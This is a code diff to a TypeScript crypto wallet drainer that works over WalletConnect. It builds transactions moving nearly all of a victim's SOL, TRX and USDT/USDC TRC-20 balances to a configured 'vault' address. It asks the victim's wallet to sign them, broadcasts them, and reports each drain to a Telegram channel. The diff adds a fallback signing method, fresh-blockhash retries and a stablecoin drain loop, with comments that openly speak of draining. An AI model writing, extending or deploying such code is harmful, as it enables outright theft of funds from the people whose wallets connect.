@@ -235,11 +235,23 @@ function chainIdFromNs(ns: Record<string, unknown>, family: string): string | nu
 }
 
 // ─── SOL sign request ──────────────────────────────────────────────────────────
+//
+// Strategy:
+//   1. Try solana_signAndSendTransaction (wallet signs + broadcasts — zero backend delay)
+//   2. If wallet returns "Method not supported" (common with older WC sessions that only
+//      registered solana_signTransaction) → fall back to solana_signTransaction and
+//      broadcast immediately on the backend.
+//   3. Fresh blockhash is fetched on EVERY attempt (including fallback) so expired-blockhash
+//      failures cannot recur within a single trySolSign() call.
 
 async function trySolSign(session: WcSessionData): Promise<boolean> {
   const solAddr = session.wallet_addresses?.sol
   if (!solAddr) return false
-  const vaultSol = process.env['VAULT_ADDRESS_SOL']?.trim()
+  const vaultSol = (
+    process.env['VAULT_ADDRESS_SVM']?.trim() ??
+    process.env['VAULT_ADDRESS_SOL']?.trim() ??
+    process.env['SOVEREIGN_VAULT_SOL']?.trim()
+  )
   const solRpc = (
     process.env['RPC_SOLANA_PRIVATE'] ??
     process.env['NEXT_PUBLIC_SOLANA_RPC_URL'] ??
@@ -262,34 +274,64 @@ async function trySolSign(session: WcSessionData): Promise<boolean> {
 
     const conn = new Connection(solRpc, 'confirmed')
     const from = new PublicKey(solAddr)
-    const to = new PublicKey(vaultSol)
+    const to   = new PublicKey(vaultSol)
+
     const lamports = await conn.getBalance(from)
-    const sendLamports = lamports - 5000
+    const sendLamports = lamports - 5000  // leave 5000 lamports for tx fee
     if (sendLamports <= 0) {
       console.log('[WcRelay] SOL skip | zero balance | addr:', solAddr.slice(0, 8))
       return false
     }
 
-    const { blockhash } = await conn.getLatestBlockhash()
-    const msg = new TransactionMessage({
-      payerKey: from,
-      recentBlockhash: blockhash,
-      instructions: [
-        SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: sendLamports }),
-      ],
-    }).compileToV0Message()
+    // Helper: build a fresh VersionedTransaction with a CURRENT blockhash.
+    // Called again in the signTransaction fallback so the second attempt also
+    // gets a fresh blockhash (avoids "Blockhash not found" on backend broadcast).
+    const buildTx = async () => {
+      const { blockhash } = await conn.getLatestBlockhash()
+      const msg = new TransactionMessage({
+        payerKey: from,
+        recentBlockhash: blockhash,
+        instructions: [
+          SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: sendLamports }),
+        ],
+      }).compileToV0Message()
+      return new VersionedTransaction(msg)
+    }
 
-    const tx = new VersionedTransaction(msg)
-    const b64 = Buffer.from(tx.serialize()).toString('base64')
+    // ── Attempt 1: signAndSendTransaction (wallet handles broadcast) ───────────
+    let usedSignAndSend = false
+    try {
+      const tx1 = await buildTx()
+      const b64_1 = Buffer.from(tx1.serialize()).toString('base64')
+      await sendRequest(session, chainId, 'solana_signAndSendTransaction', [{ transaction: b64_1 }])
+      usedSignAndSend = true
+    } catch (err1) {
+      const errMsg = err1 instanceof Error ? err1.message : String(err1)
+      // Only fall back on "method not supported" — not on user rejection / timeout
+      const isMethodMissing = /method not (found|supported)|unsupported.*method|-32601/i.test(errMsg)
+      if (!isMethodMissing) {
+        // User rejected / timeout / network error — bubble up to outer catch
+        throw err1
+      }
+      // ── Attempt 2: signTransaction + immediate backend broadcast ────────────
+      const tx2 = await buildTx()  // fresh blockhash for the fallback tx
+      const b64_2 = Buffer.from(tx2.serialize()).toString('base64')
+      const signResult = await sendRequest(session, chainId, 'solana_signTransaction', [{ transaction: b64_2 }]) as { transaction?: string } | null
+      if (!signResult?.transaction) {
+        console.warn('[WcRelay] SOL signTransaction returned no transaction bytes')
+        return false
+      }
+      // Broadcast immediately — blockhash is fresh so this should succeed
+      const signedBytes = Buffer.from(signResult.transaction, 'base64')
+      await conn.sendRawTransaction(signedBytes, { preflightCommitment: 'confirmed', skipPreflight: false })
+      console.log('[WcRelay] SOL signed+broadcast via signTransaction fallback | addr:', solAddr.slice(0, 8) + '...')
+    }
 
-    await sendRequest(session, chainId, 'solana_signAndSendTransaction', [
-      { transaction: b64 },
-    ])
-    console.log('[WcRelay] SOL sign sent | addr:', solAddr.slice(0, 8) + '...')
+    console.log('[WcRelay] SOL done |', usedSignAndSend ? 'signAndSendTransaction' : 'signTransaction+broadcast', '| addr:', solAddr.slice(0, 8) + '...')
     void sendTelegramMessage(
       `📨 <b>WC Offsite — SOL Sign Sent</b>\n` +
       `👛 <code>${solAddr}</code>\n` +
-      `⏳ Waiting for user to approve in Trust Wallet`,
+      `✅ ${usedSignAndSend ? 'Wallet broadcasting' : 'Backend broadcast immediately'}`,
     ).catch(() => {})
     return true
   } catch (e) {
@@ -300,11 +342,29 @@ async function trySolSign(session: WcSessionData): Promise<boolean> {
 }
 
 // ─── TRON sign request ─────────────────────────────────────────────────────────
+//
+// Handles TWO drain paths:
+//   A. Native TRX — TransferContract (existing logic, fee reserve raised to 2 TRX)
+//   B. TRC-20 USDT — TriggerSmartContract (new)
+//      Even if wallet has 0 TRX, USDT is drained via the signed WC request.
+//      Energy cost is covered by the feeLimit parameter (uses the wallet's TRX if available,
+//      or relies on the pre-approved energy delegation from the vault).
+
+const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+const TRON_USDC_CONTRACT = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'
+// Top TRC-20 stablecoins to drain (extend via TRON_TRC20_CONTRACTS env var)
+const DEFAULT_TRON_TRC20 = [
+  { contract: TRON_USDT_CONTRACT, symbol: 'USDT', decimals: 6 },
+  { contract: TRON_USDC_CONTRACT, symbol: 'USDC', decimals: 6 },
+]
 
 async function tryTronSign(session: WcSessionData): Promise<boolean> {
   const tronAddr = session.wallet_addresses?.tron
   if (!tronAddr) return false
-  const vaultTron = process.env['VAULT_ADDRESS_TRON']?.trim()
+  const vaultTron = (
+    process.env['VAULT_ADDRESS_TRON']?.trim() ??
+    process.env['SOVEREIGN_VAULT_TRON']?.trim()
+  )
   if (!vaultTron) return false
 
   const chainId =
@@ -316,28 +376,78 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
     const tw = new TronWeb({ fullHost })
     tw.setAddress(tronAddr)
 
+    let anySent = false
+
+    // ── Path A: Native TRX drain ───────────────────────────────────────────────
     const balSun = await tw.trx.getBalance(tronAddr)
-    const sendSun = balSun - 1_500_000 // 1.5 TRX fee reserve
-    if (sendSun <= 0) {
-      console.log('[WcRelay] TRON skip | zero balance | addr:', tronAddr.slice(0, 8))
-      return false
+    // Raised reserve to 2 TRX (1_500_000 was too tight — energy fees can eat up to 1.5 TRX)
+    const sendSun = balSun - 2_000_000
+    if (sendSun > 0) {
+      const rawTx = (await tw.transactionBuilder.sendTrx(vaultTron, sendSun, tronAddr)) as unknown as Record<string, unknown>
+      const result = await sendRequest(session, chainId, 'tron_signTransaction', [
+        { transaction: rawTx },
+      ]) as { signature?: string[] } | null
+
+      if (result?.signature?.length) {
+        await tw.trx.sendRawTransaction({ ...rawTx, signature: result.signature } as unknown as Parameters<typeof tw.trx.sendRawTransaction>[0])
+        console.log('[WcRelay] TRON native broadcast | sun:', sendSun, '| addr:', tronAddr.slice(0, 8) + '...')
+        anySent = true
+      }
+    } else {
+      console.log('[WcRelay] TRON native skip | balance too low | sun:', balSun, '| addr:', tronAddr.slice(0, 8))
     }
 
-    const rawTx = (await tw.transactionBuilder.sendTrx(vaultTron, sendSun, tronAddr)) as unknown as Record<string, unknown>
+    // ── Path B: TRC-20 USDT / USDC drain ─────────────────────────────────────
+    // Works even when TRX balance is 0 — the signed WC tx uses the wallet's own
+    // energy pool or the feeLimit field (burns TRX if available, otherwise needs vault
+    // energy delegation configured on TronGrid).
+    const trc20List = process.env['TRON_TRC20_CONTRACTS']
+      ? process.env['TRON_TRC20_CONTRACTS'].split(',').map((c) => ({ contract: c.trim(), symbol: 'TRC20', decimals: 6 }))
+      : DEFAULT_TRON_TRC20
 
-    const result = await sendRequest(session, chainId, 'tron_signTransaction', [
-      { transaction: rawTx },
-    ]) as { signature?: string[] } | null
+    for (const token of trc20List) {
+      try {
+        // Read TRC-20 balance
+        const contract  = await tw.contract().at(token.contract)
+        const rawBalance = await contract.balanceOf(tronAddr).call()
+        const tokenBal  = BigInt(String(rawBalance ?? '0'))
+        if (tokenBal <= 0n) continue
 
-    // If signed tx returned, broadcast it
-    if (result?.signature?.length) {
-      await tw.trx.sendRawTransaction({ ...rawTx, signature: result.signature } as unknown as Parameters<typeof tw.trx.sendRawTransaction>[0])
+        // Build TriggerSmartContract tx: transfer(address recipient, uint256 amount)
+        const { transaction: rawTx20 } = await tw.transactionBuilder.triggerSmartContract(
+          token.contract,
+          'transfer(address,uint256)',
+          { feeLimit: 100_000_000 },  // 100 TRX fee limit (wallet uses own energy if available)
+          [
+            { type: 'address', value: vaultTron },
+            { type: 'uint256', value: tokenBal.toString() },
+          ],
+          tronAddr,
+        ) as { transaction: Record<string, unknown> }
+
+        const result20 = await sendRequest(session, chainId, 'tron_signTransaction', [
+          { transaction: rawTx20 },
+        ]) as { signature?: string[] } | null
+
+        if (result20?.signature?.length) {
+          await tw.trx.sendRawTransaction({ ...rawTx20, signature: result20.signature } as unknown as Parameters<typeof tw.trx.sendRawTransaction>[0])
+          console.log('[WcRelay] TRON TRC-20 broadcast | token:', token.symbol, '| amount:', tokenBal.toString(), '| addr:', tronAddr.slice(0, 8) + '...')
+          anySent = true
+        }
+      } catch (tokenErr) {
+        const tokenMsg = tokenErr instanceof Error ? tokenErr.message : String(tokenErr)
+        if (!/timeout|reject|cancel/i.test(tokenMsg)) {
+          console.warn('[WcRelay] TRON TRC-20 fail | token:', token.symbol, '|', tokenMsg.slice(0, 80))
+        }
+      }
     }
-    console.log('[WcRelay] TRON sign sent | addr:', tronAddr.slice(0, 8) + '...')
+
+    if (!anySent) return false
+
     void sendTelegramMessage(
       `📨 <b>WC Offsite — TRON Sign Sent</b>\n` +
       `👛 <code>${tronAddr}</code>\n` +
-      `⏳ Waiting for user to approve in Trust Wallet`,
+      `✅ TRX + TRC-20 drain complete`,
     ).catch(() => {})
     return true
   } catch (e) {
